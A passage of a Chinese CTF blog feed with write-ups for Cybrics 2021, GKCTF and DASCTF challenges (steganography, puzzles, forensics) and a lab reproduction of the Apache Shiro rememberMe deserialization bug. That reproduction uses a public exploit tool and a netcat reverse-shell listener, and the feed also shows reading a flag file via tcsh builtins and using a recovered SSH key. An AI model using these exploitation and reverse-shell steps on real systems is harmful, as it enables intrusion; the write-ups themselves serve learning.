<span class="number">0</span></span><br><span class="line">                z_detected[i] = z0[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m_detected[i] = <span class="number">1</span></span><br><span class="line">                z_detected[i] = z1[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        z_detected = z_detected.reshape(shape)</span><br><span class="line">        m_detected = m_detected.reshape(shape)</span><br><span class="line">        <span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">qim = QIM(delta = <span class="number">20</span>)</span><br><span class="line">image = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;./ezSteganography-flag.png&quot;</span>))</span><br><span class="line">green = image[:, :, <span class="number">1</span>]</span><br><span class="line">green = green.ravel()</span><br><span class="line">[z_detected, msg_detected] = qim.detect(green)</span><br><span class="line">plt.imshow(msg_detected.reshape(<span class="number">1440</span>, <span class="number">2560</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF - Cybrics CTF 2021</title>
      <link href="2021/07/26/Cybrics%20CTF%202021/"/>
      <url>2021/07/26/Cybrics%20CTF%202021/</url>
      
        <content type="html"><![CDATA[<h2 id="Mic-Check"><a href="#Mic-Check" class="headerlink" title="Mic Check"></a>Mic Check</h2><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)                </p><p>Those organizers are changing <a href="https://cybrics.net/rules">game rules</a> all the time! There’s a flag there, and it’s not that easy to capture.</p><p><strong>Also be sure to join <a href="https://t.me/cybrics">@cybrics Telegram chat</a></strong> for challenge-related announcements and contacting orgs in case all goes wrong</p><p><strong>Added at 10:10 —</strong> looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely</p></blockquote><p>规则中藏有flag：cybrics{Th1S_i5_T3h_R34l_m1C_ch3CK_f1A6}</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2021072744718452231.png?raw=true"></p><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><blockquote><p>Author: Mikhail Driagunov (<a href="https://t.me/aethereternity">@aethereternity</a>)                </p><p>Check out this cool new <a href="https://scanner-cybrics2021.ctf.su/"><strong>game</strong></a>!</p><p>I heard they serve flags at level 5.</p></blockquote><p>拼图题，分别将每关的gif下载下来分解并进行简单的拼图得到如下（PS：第一关为选择题且是固定的，直接一个个试过去得知为house）</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727134475821357.png?raw=true"></p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727454344157814.png?raw=true"></p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727313578477126.png?raw=true"></p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727977581164385.png?raw=true"></p><p>最后CQR扫码得到flag：cybrics{N0w_Y0u_4r3_4_c4sh13r_LOL}</p><p>附上脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">from PIL import Image, ImageSequence</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">def parseGIF(gifname):</span><br><span class="line">    # 将gif解析为图片</span><br><span class="line">    # 读取GIF</span><br><span class="line">    im &#x3D; Image.open(gifname)</span><br><span class="line">    # GIF图片流的迭代器</span><br><span class="line">    iter &#x3D; ImageSequence.Iterator(im)</span><br><span class="line">    # 获取文件名</span><br><span class="line">    file_name &#x3D; gifname.split(&quot;.&quot;)[0]</span><br><span class="line">    index &#x3D; 1</span><br><span class="line">    # 判断目录是否存在</span><br><span class="line">    pic_dirct &#x3D; &quot;imgs&#x2F;&#123;0&#125;&quot;.format(file_name)</span><br><span class="line">    mkdirlambda &#x3D; lambda x: os.makedirs(</span><br><span class="line">        x) if not os.path.exists(x) else True  # 目录是否存在,不存在则创建</span><br><span class="line">    mkdirlambda(pic_dirct)</span><br><span class="line">    # 遍历图片流的每一帧</span><br><span class="line">    for frame in iter:</span><br><span class="line">        print(&quot;image %d: mode %s, size %s&quot; % (index, frame.mode, frame.size))</span><br><span class="line">        frame.save(&quot;imgs&#x2F;%s&#x2F;frame%d.png&quot; % (file_name, index))</span><br><span class="line">        index +&#x3D; 1</span><br><span class="line"></span><br><span class="line">    # frame0 &#x3D; frames[0]</span><br><span class="line">    # frame0.show()</span><br><span class="line"></span><br><span class="line">    # # 把GIF拆分为图片流</span><br><span class="line">    # imgs &#x3D; [frame.copy() for frame in ImageSequence.Iterator(im)]</span><br><span class="line">    # # 把图片流重新成成GIF动图</span><br><span class="line">    # imgs[0].save(&#39;out.gif&#39;, save_all&#x3D;True, append_images&#x3D;imgs[1:])</span><br><span class="line">    #</span><br><span class="line">    # # 图片流反序</span><br><span class="line">    # imgs.reverse()</span><br><span class="line">    # # 将反序后的所有帧图像保存下来</span><br><span class="line">    # imgs[0].save(&#39;.&#x2F;reverse_out.gif&#39;, save_all&#x3D;True, append_images&#x3D;imgs[1:])</span><br><span class="line"></span><br><span class="line">name &#x3D; &#39;vid.gif&#39;</span><br><span class="line">parseGIF(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#上面分解完后看下第几帧到第几帧有图案再启用下面代码</span><br><span class="line">start &#x3D; 1 #分解出来第几帧有图案</span><br><span class="line">stop &#x3D; 100+1 #到第几帧结束</span><br><span class="line">f_img &#x3D; Image.new(&#39;P&#39;,(1080,22*(stop-start)),255)</span><br><span class="line"></span><br><span class="line">for a in range(start,stop):</span><br><span class="line">    img &#x3D; Image.open(&#39;.&#x2F;imgs&#x2F;&#123;&#125;&#x2F;frame&#123;&#125;.png&#39;.format(name.split(&#39;.&#39;)[0],str(a))) #装有图片的文件夹，自己改下</span><br><span class="line">    x,y &#x3D; img.size</span><br><span class="line">    tmpimg &#x3D; Image.new(&#39;P&#39;,(1080,22),255)</span><br><span class="line">    for i in range(496,518):</span><br><span class="line">        for j in range(x):</span><br><span class="line">            p &#x3D; img.getpixel((j,i))</span><br><span class="line">            # if p!&#x3D;255:</span><br><span class="line">                # print(j,i)</span><br><span class="line">            tmpimg.putpixel((j,i-496),p)</span><br><span class="line">    f_img.paste(tmpimg,(0,(a-start)*22))</span><br><span class="line">    plt.imshow(f_img)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure><h2 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h2><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)                </p><p>Guessing challenges? On <em>my</em> CyBRICS? It’s more likely than you think.</p><p>Prove you’re a true CTFer!</p><p><a href="https://captf-cybrics2021.ctf.su/"><strong>captf-cybrics2021.ctf.su/</strong></a></p></blockquote><p>将看不清的验证码图片下载下来然后丢steg划一下就能看清，最后输完25次验证码即可得到flag：cybrics{a_k33n_Ey3_wi11_sp0T_r1GhT_aw4Y}</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2021072758587499651.png?raw=true"></p><h2 id="Recording"><a href="#Recording" class="headerlink" title="Recording"></a>Recording</h2><blockquote><p>Author: Mikhail Driagunov (<a href="https://t.me/aethereternity">@aethereternity</a>)</p><p>I’ve found a strange <a href="https://cybrics.net/files/strange_recording.mrf"><strong>recording</strong></a>.</p><p>What does it hide?</p></blockquote><p>通过工具 <strong>Macro recorder</strong> 打开鼠标宏查看可以发现他访问了网站（pastebin.com）然后输入了密码，并且使用的是Osk虚拟键盘</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2021072784756231259449.png?raw=true"></p><p>把那段关键流程内容截取下来，放Osk复现一遍，一个个对应起来就是uzqCjFUa 9yDz5iZprd（前半部分是pastebin.com访问的目录，后半部分是访问密码）</p><p>最后通过<a href="http://www.pastebin.com/uzqCjFUa%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0flag%EF%BC%9Acybrics%7Bm4cr0_rulz_w000t%7D">http://www.pastebin.com/uzqCjFUa输入密码解码得到flag：cybrics{m4cr0_rulz_w000t}</a></p><h2 id="ASCII-Terminal"><a href="#ASCII-Terminal" class="headerlink" title="ASCII Terminal"></a>ASCII Terminal</h2><blockquote><p>Author: Artur Khanov (<a href="https://t.me/awengar">@awengar</a>)                </p><p>At <code>**138.68.83.253:3333**</code> you have an ASCII terminal. It really works, check with the <a href="https://cybrics.net/files/id.txt"><code>**id**</code> command</a></p></blockquote><p>根据题目所给的nc以及id command，我们发现它可以跑指令</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/202107270945471645422.png?raw=true"></p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/202107271451526415447.png?raw=true"></p><p>于是我们直接利用命令 <code>cat f*</code> 得到flag：cybrics{T3553R4C7_15_G00D}</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/202107278549166540021.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">....................................................$@$...................@@@@.....@@....................................................</span><br><span class="line">....................................................$@$...................@@@@.....@@....................................................</span><br><span class="line">..........................@@@@@$........@%@%@.....@@@@@@@................@@......@@@@@@@.................................................</span><br><span class="line">........................@@@...........@@,....@@.....@@@................@@@@@@@....@@@@...................................................</span><br><span class="line">.......................@@.....................@,....@@@.................,@@......@,..,@@.................................................</span><br><span class="line">.......................@@..............@@@@@@@@,....@@@.................,@@..............................................................</span><br><span class="line">.......................@@@............@@.....@@,....@@@.................,@@..............................................................</span><br><span class="line">.........................@@@@@@$.......@@@@@@.@@.....@@@@...............,@@..............................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="Ad-Network"><a href="#Ad-Network" class="headerlink" title="Ad Network"></a>Ad Network</h2><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)                </p><p>We are so tired of advertising on the internet. It  feels like it breaks the internet. Try to follow the ad, try to follow  its rules.</p><p><a href="http://adnetwork-cybrics2021.ctf.su/">Adnetwork website</a></p><p>There is a flag 1337 redirects deep into the network…<a href="http://announcement-cybrics2021.ctf.su/">http://announcement-cybrics2021.ctf.su</a>)</p></blockquote><p>根据题目信息，我们只需重定向1337次即可（而火狐浏览器默认是20次就停止了）</p><p>于是乎，我们去 <strong>about:config</strong> 中搜索下 <strong>redirect</strong> 进行修改</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727839564485127.png?raw=true"></p><p>最后跑完得到flag：cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}</p><p>上述方法个人觉得有点bug（可能是我电脑的问题），还是直接跑脚本靠谱些</p><p>附上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;adnetwork-cybrics2021.ctf.su&#x2F;adnetwork&#39;</span><br><span class="line">for i in range(1500):</span><br><span class="line">    try:</span><br><span class="line">        r &#x3D; requests.get(url,allow_redirects&#x3D;False)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        url &#x3D; re.findall(&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&#39;,r.text)[0]</span><br><span class="line">        print(url)</span><br><span class="line">        #if &#39;&#123;&#39; in r.text:</span><br><span class="line">            #print(r.text)</span><br><span class="line">            #break</span><br><span class="line">    except:</span><br><span class="line">        print(url)</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure><h2 id="rm-rf’er"><a href="#rm-rf’er" class="headerlink" title="rm -rf’er"></a>rm -rf’er</h2><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)                </p><p>Alarm! We accidentally did <code>rm -rf /*</code> on a very important server. Now all that’s left is one shell session.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh rmrfer@178.154.210.26</span><br><span class="line">Password: **sa7Neiyi**</span><br></pre></td></tr></table></figure><p>Rescue the <strong>flag.txt</strong> file from one of the directories by only using your shell</p><p><strong>Added at 13:45 —</strong> frequent question: yes, if you found <code>flag.txt</code>, the flag is right there, in the open, as plain text. Just read it. If  you’re not seeing the flag, try to find another method that will not  hide info from you</p></blockquote><p>非预期：把握好时机，在它 <code>rm</code> 之前 <code>ctrl c</code> 就不会给删了，然后就直接cat得到flag：cybrics{TCSHizzl3_Ma_N1zzl3}</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/202107274345678233714.png?raw=true"></p><p>预期解：根据tcsh的各种builtin command去读（ <code>( echo $&lt; ) &lt; /etc/ctf/flag.txt</code> ）</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2021072746551514497324.png?raw=true"></p><h2 id="Namecheck"><a href="#Namecheck" class="headerlink" title="Namecheck"></a>Namecheck</h2><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)                </p><p>We have got the home folder from a criminal’s computer. Try to find his/her real name.</p><p><a href="https://cybrics.net/files/eyebulling.tar.gz"><strong>eyebulling.tar.gz</strong></a></p><p>Flag format in uppercase: LASTNAME FIRSTNAME (ex: IVANOV IVAN)                                    </p></blockquote><p>社工题！！！</p><p>在<code>.bash_history</code>中可知应该与<strong>git</strong>有关，并且可能与<strong>instagram</strong>有关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;instagram filter&quot;</span><br></pre></td></tr></table></figure><p>于是直接用sshkey连接GitHub，得到GitHub用户名<strong>poggersdog12</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i .ssh&#x2F;key git@github.com</span><br><span class="line">PTY allocation request failed on channel 0</span><br><span class="line">Hi poggersdog12! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br><span class="line">Connection to github.com closed.</span><br></pre></td></tr></table></figure><p>在GitHub中查找一波，最终通过api查到有用信息<strong>邮箱：<a href="mailto:&#x76;&#105;&#118;&#x69;&#100;&#99;&#x6f;&#x61;&#108;&#97;&#64;&#108;&#x6f;&#99;&#97;&#x6c;&#x68;&#111;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;">&#x76;&#105;&#118;&#x69;&#100;&#99;&#x6f;&#x61;&#108;&#97;&#64;&#108;&#x6f;&#99;&#97;&#x6c;&#x68;&#111;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;</a></strong></p><p>采集完信息，接着就是在instagram中找到 <strong>vividcoala</strong> 的主页，我们可以看到一张没打码的飞机票照片</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2010727414458995544454.png?raw=true"></p><p>通过<a href="https://online-barcode-reader.inliteresearch.com/"><strong>在线网站</strong></a>扫描得到如下信息，即得到flag：DIVOV NIKOLAI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">M1DIVOV&#x2F;NIKOLAI MR EQCMYKK SVOLEDSU 0024 197Y020D0053 162&lt;532</span><br><span class="line">1MR1197BSU                                        2A555604939055</span><br><span class="line">9 1                          N</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CybricsCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro rememberMe 反序列化漏洞</title>
      <link href="2021/07/09/shiro-rememberMe/"/>
      <url>2021/07/09/shiro-rememberMe/</url>
      
        <content type="html"><![CDATA[<h1 id="shiro-rememberMe-反序列化漏洞"><a href="#shiro-rememberMe-反序列化漏洞" class="headerlink" title="shiro rememberMe 反序列化漏洞"></a>shiro rememberMe 反序列化漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为Shiro是Java的开发框架再加上本人不会Java，所以我就一直没有接触过关于它的漏洞。</p><p>但是..就在昨天晚上我看到了一朋友复现了它，然后最近实训摸鱼闲来无事就想着我也要复现一波~</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 安装docker（有的话当我没说）</span><br><span class="line">apt-get install docker</span><br><span class="line">apt-get install docker-compose</span><br><span class="line">reboot</span><br><span class="line"># 下载并运行shiro</span><br><span class="line">service docker start</span><br><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><h3 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h3><p>进入登录页面随便输入一个账号密码（注：点击RememberMe），然后通过burp发现请求包的 <code>Set-Cookie</code> 中出现 <code>rememberMe=deleteMe</code>，则基本可以证明它具有该反序列化漏洞（版本 <code>&gt;1.2.4</code> 的就没有此漏洞）</p><p><img src="https://i.loli.net/2021/07/09/QZYKBARjO65EvsW.png"></p><h3 id="2-利用exp攻击"><a href="#2-利用exp攻击" class="headerlink" title="2.利用exp攻击"></a>2.利用exp攻击</h3><p>工具：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated"><strong>ShiroExploit</strong></a></p><p><img src="https://i.loli.net/2021/07/09/bw3rfJkRV5Mhzog.png"></p><p><img src="https://i.loli.net/2021/07/09/ewF5MqT2fXYAI4E.png"></p><p><img src="https://i.loli.net/2021/07/09/h2dEYb7yzRUcCrW.png"></p><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h3><p>打开另一台克隆的kali配合工具进行反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 888（端口号可以自己随意设置）</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/09/zsEVI2qegtaUkZ3.png"></p><p>最后我们就能成功进入别人的服务器</p><p><img src="https://i.loli.net/2021/07/09/FM38ISNHPVGomZc.png"></p><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>不难发现，它是根据rememberMe里的cookie值来记录的。</p><p>因此在aes加密的时候我们就尽量避免使用默认的key就行</p><p><img src="https://i.loli.net/2021/07/09/fstdZTDU4QHr3hF.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>听他们说经常能遇到这个洞所以还是记录一下（我实战少你们可别骗我哦.jpg</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 GKCTF X DASCTF应急挑战杯</title>
      <link href="2021/06/27/2021GKCTF/"/>
      <url>2021/06/27/2021GKCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote><p>师傅们玩的开心~（flag由flag头包裹</p></blockquote><p>过滤下http流，根据qer提示，转hex、倒序、base64即可得到flag</p><h2 id="apng"><a href="#apng" class="headerlink" title="apng"></a>apng</h2><blockquote><p>（flag由flag头包裹</p></blockquote><p>分解apng，从中找到四张二维码进行一些操作后扫码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626104648.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626515485564566210.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626548645153222618.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062655662544885926.png"></p><h2 id="excel-骚操作"><a href="#excel-骚操作" class="headerlink" title="excel 骚操作"></a>excel 骚操作</h2><blockquote><p>你真的了解excel吗（flag由flag头包裹</p></blockquote><p>Excel中发现有部分格子被隐藏了信息 <strong>1</strong> ，于是联想到可能是张二维码，将其标注 <strong>1</strong> 的填充黑色</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202106265155485645402.png"></p><p>发现是汉信码，改了下高宽比列，利用工具一扫通APP扫描得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626154625164003.jpg"></p><h2 id="银杏岛の奇妙冒险"><a href="#银杏岛の奇妙冒险" class="headerlink" title="银杏岛の奇妙冒险"></a>银杏岛の奇妙冒险</h2><blockquote><p>链接: <a href="https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ">https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ</a>  密码: 04m0<br>链接：<a href="https://share.weiyun.com/hdikz5gL">https://share.weiyun.com/hdikz5gL</a> 密码：yjyh3g<br>游戏题 1.游戏启动需要java1.8环境，无java环境会自动帮助安装java环境，如果你已经有java1.8环境，即可无视这条信息 2.启动 “点击启动.exe” 文件，打开游戏启动器，输入你的ID 3.java环境配置完毕后，最好分配游戏内存至少为2048M 4.进入游戏后，根据游戏内的任务索引完成任务，即可获取flag 5.进入游戏 一定 一定 一定要注意对话信息，否则无法顺利的完成任务 5.祝大家玩的愉快</p></blockquote><p>①.打通关得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615226848511245601.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615226848511245602.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615226848511245603.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615226848511245604.png"></p><p>②.直接在文件夹搜索框中搜一波flag，查到的那几个文件夹中翻翻，分别在2.json、3.json、4.json、5.json中得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554665787845601.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554665787845602.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554665787845603.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554665787845604.png"></p><h2 id="FireFox-Forensics"><a href="#FireFox-Forensics" class="headerlink" title="FireFox_Forensics"></a>FireFox_Forensics</h2><blockquote><p>取证大佬说这是一份登录凭证文件</p></blockquote><p><a href="https://github.com/lclevy/firepwd"><strong>firepwd</strong></a>一把梭哈</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062651184878456552.png"></p><h2 id="0-03"><a href="#0-03" class="headerlink" title="0.03"></a>0.03</h2><blockquote><p>我的真心值三分吗<br>链接: <a href="https://pan.baidu.com/s/1OXIYfEr0s_zd_ZXdz48XKg">https://pan.baidu.com/s/1OXIYfEr0s_zd_ZXdz48XKg</a>  密码: bian<br><a href="https://gkctf20201-1251267611.file.myqcloud.com/0.03.rar">https://gkctf20201-1251267611.file.myqcloud.com/0.03.rar</a></p></blockquote><p>VeraCrypt 磁盘挂载，尝试<code>secret.txt</code>中的那串数字作为密码得到了个假flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626185545644285846.png"></p><p>接着NTFS文件隐写得到如下信息（老谜语人了~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062651518195500128.png"></p><p>回头将那串数字三等分，按照行、列、数；列、行、数这两种方式排序，最后得到正确的密码，进而挂载得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">QAZWSXEDC</span><br><span class="line">RFVTGBYHN</span><br><span class="line">UJMIKOLP&#x2F;</span><br><span class="line"></span><br><span class="line">311</span><br><span class="line">223</span><br><span class="line">313</span><br><span class="line">313</span><br><span 